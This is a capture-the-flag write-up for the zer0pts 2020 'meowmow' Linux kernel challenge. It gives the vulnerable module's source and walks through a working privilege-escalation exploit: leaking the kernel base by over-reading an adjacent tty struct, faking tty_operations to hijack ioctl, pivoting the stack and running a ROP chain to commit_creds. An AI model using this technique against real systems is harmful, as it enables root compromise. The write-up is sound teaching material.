# zer0pts2020 meowmeo



## vulnerablity 

The vulnerability lies in a proc entry file, whose source code is given, as

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define DEVICE_NAME "memo"
#define MAX_SIZE 0x400

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("zer0pts CTF 2020 meowmow");

char *memo = NULL;

static int __init module_initialize(void);
static void __exit module_cleanup(void);
static loff_t mod_llseek(struct file*, loff_t, int);
static int mod_open(struct inode*, struct file*);
static ssize_t mod_read(struct file*, char __user*, size_t, loff_t*);
static ssize_t mod_write(struct file*, const char __user*, size_t, loff_t *);
static int mod_close(struct inode*, struct file*);
static dev_t dev_id;
static struct cdev c_dev;

static struct file_operations module_fops = {
  .owner = THIS_MODULE,
  .llseek  = mod_llseek,
  .read    = mod_read,
  .write   = mod_write,
  .open    = mod_open,
  .release = mod_close,
};

static int mod_open(struct inode *inode, struct file *file)
{
  if (memo == NULL) {
    memo = kmalloc(MAX_SIZE, GFP_KERNEL);
    memset(memo, 0, MAX_SIZE);
  }
  return 0;
}

static ssize_t mod_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
  if (filp->f_pos < 0 || filp->f_pos >= MAX_SIZE) return 0;
  if (count < 0) return 0;
  if (count > MAX_SIZE) count = MAX_SIZE - *f_pos;
  if (copy_to_user(buf, &memo[filp->f_pos], count)) return -EFAULT;
  *f_pos += count;
  return count;
}

static ssize_t mod_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
  if (filp->f_pos < 0 || filp->f_pos >= MAX_SIZE) return 0;
  if (count < 0) return 0;
  if (count > MAX_SIZE) count = MAX_SIZE - *f_pos;
  if (copy_from_user(&memo[filp->f_pos], buf, count)) return -EFAULT;
  *f_pos += count;
  return count;
}

static loff_t mod_llseek(struct file *filp, loff_t offset, int whence)
{
  loff_t newpos;
  switch(whence) {
  case SEEK_SET:
    newpos = offset;
    break;
  case SEEK_CUR:
    newpos = filp->f_pos + offset;
    break;
  case SEEK_END:
    newpos = strlen(memo) + offset;
    break;
  default:
    return -EINVAL;
  }
  if (newpos < 0) return -EINVAL;
  filp->f_pos = newpos;
  return newpos;
}

static int mod_close(struct inode *inode, struct file *file)
{
  return 0;
}

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
    printk(KERN_WARNING "Failed to register device\n");
    return -EBUSY;
  }

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    printk(KERN_WARNING "Failed to add cdev\n");
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }
  
  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);

```



​	The vulnerability is obviouse: there is a simple logic flaw in the implementation in `mod_llseek` and `mod_read/mod_write`. The flaw gives us an opportunity to overwrite and overread the buffer `memo` which is a heap chunk in kernel space.



## exploitation

from top level

1. we open */dev/ptmx* after opening */dev/memo*, which will place a *tty* struct right after the chunk `memo`. 
2. we overread the `memo` to get function pointers in the *tty* struct to leak the kernel load address
3. we overwrite the `memo` to overwrite the *seq_operations* in the *tty* struct to hijack its *ioctl* to a gadget which will hijack the kernel stack to `memo`
4. we place a rop chain in `memo`, when the kernel stack is hijacked to it we will perform privilege escalation by ROP and ret2user to prompt a root shell

<img src="pic/Untitled Diagram.drawio.png" alt="Untitled Diagram.drawio" style="zoom:80%;" />





### 1.leak kernel load base address

​	When the */dev/memo* is opened for the first time, a heap chunk wil be allocated as `memo`. We immediately open */dev/ptmx* which will palce a *tty* struct right after `memo`. 

​	We use *mod_llseek* and *mod_read* to overread *tty* struct. Trivial operation

```c
	save_state(state);
    int fd_m = open("/dev/memo", O_RDWR);
    int fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if(fd_m == -1 || fd_tty == -1) ErrExit("[-] cannot open dev file");

    // leak 
    if(lseek(fd_m, 0x300, SEEK_SET) != 0x300) ErrExit("[-] lseek error");
    char buf[0x400];
    read(fd_m, buf, 0x400);
    unsigned long *p;
    p = (unsigned long*)&buf[0x100];
    kernel_load_base = p[3] - 0xE65900;
    memo_buf = p[7] - 0x38 - 0x400;
    printf("[*] kernel load @ 0x%lx\n", kernel_load_base);
    printf("[*] memo buf @ 0x%lx\n", memo_buf);
    printf("[*] gadget1 @ 0x%lx\n", kernel_load_base+GADGET1);
```

​	The *tty_operations* in the *tty* struct have a fixed offset with the kernel load base address. And list pointers in the *ldisk_sem* filed of *tty* will leak the address of the *tty* struct, which in turn leak the address of the `memo`



### 2.overwrite the *tty_operations* vtable & *ioctl*

​	We use *mod_llseek* and *mod_write* to overwrite the address of *tty_opeartions* in the *tty* struct to make it point to an area in `memo`, and we will place a fake *tty_operations* vtable there whose *ioctl* is the gadget that hijack kernel stack.

```c
    p[3] = memo_buf+0x300;
    p = (unsigned long*)(buf+8*12);
    *p = kernel_load_base+GADGET1;
    if(lseek(fd_m, 0x300, SEEK_SET) != 0x300) ErrExit("[-] lseek error2");
    if(write(fd_m, buf, 0x400) != 0x400) ErrExit("[-] write error1");
```

​	*ioctl* is the 13rd function pointer in *struct tty_operations*, thus having an offset of `8*12`

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	unsigned int (*write_room)(struct tty_struct *tty);
	unsigned int (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
```

​	

​	By now we have hijacked the ioctl of the opened tty, when we ioctl the tty the control flows goes into the gadget we place at the fake vtabl. The gadget will hijack the stack to the start of `memo`. The hijack can be achived because ioctl takes 3 argument plus the 2nd and 3rd ones are fully user controlable. We pass the address of the `memo` as the 3rd argument of ioctl and the value will be put in register `rdx`. So if we can find a gadget like

```assembly
push rdx ; pop rsp ; ret
```

we are able to hijack the stack to `memo`.



### 3.place a rop chain in `memo`

ordinary and trivial

```c
	// place a rop chain in memo_buf
    if(lseek(fd_m, 0, SEEK_SET) != 0) ErrExit("[-] lseek error4");
    memset(buf, 0, 0x400);
    unsigned long* rop = (unsigned long*)buf;
    *rop++ = 0;
    *rop++ = kernel_load_base + POPRDI;
    *rop++ = 0;
    *rop++ = kernel_load_base + PREPARECRED;
    *rop++ = kernel_load_base + POPRCX;
    *rop++ = 0;
    *rop++ = kernel_load_base + MOVRDIRAXREP;
    *rop++ = kernel_load_base + COMMITCRED;
    *rop++ = kernel_load_base + ROPUSER;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)win;
    *rop++ = state.cs;
    *rop++ = state.rflag;
    *rop++ = state.sp;
    *rop++ = state.ss;

    if(write(fd_m, buf, 0x100) != 0x100) ErrExit("[-] write error3");
    // pass the stack address to be hijacked to as the 3rd argument and it
    // will be handled by GADGET1 as "push r12;...;pop rsp", achieve hijacking
    ioctl(fd_tty, memo_buf, memo_buf);
```



### 4.one more step

#### find another gadget to achive stack hijack

​	The only gadget I can find to hijack kerel stack by rbx is

```assembly
push rdx ; add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; ret
```



​	As we can see the gadget derefferences [rcx+0x415d5bd8] which is very likely to be an invalide address, leading to a kernel panic

<img src="pic/2021-10-26 17-26-39 的屏幕截图.png" alt="2021-10-26 17-26-39 的屏幕截图" style="zoom:80%;" />

​	We noticed a few things from the panic info

1. the value in `rcx` is 0xd85ac00 , and 0xd85ac00+0x415d5bd8=0x4EE307D8, which is exactly the address causing the kernel panic. This reveals that the kernel panics when derefferencing [rcx+0x415d5bd8], which indicates the control flow has gone to our gadget1
2. the address of our rop chain has been successfully put into register `rdx` as we can see `rdx=0xffff9ad20d85ac00`. In the mean time the value is also put into 2 other registers: `r8` and `r12`



So instead of hijack the kernel stack by value in `rbx` we can use `r8` or `r12`. After a simple search I found the following gadget

```assembly
0xffffffff8194d4e3 : push r12 ; add dword ptr [rbp + 0x41], ebx ; pop rsp ; pop r13 ; ret
```

​	There is also a derefferencing but it finally turns out working smoothly.





# some thinking

## a side-channel solve

​	The vulnerability allows us to perform overread and overwrite through `llseek`. If we `llseek` the offset with a very large value, we may achieve an arbitrary memory read and write. 



## reference

1.https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html

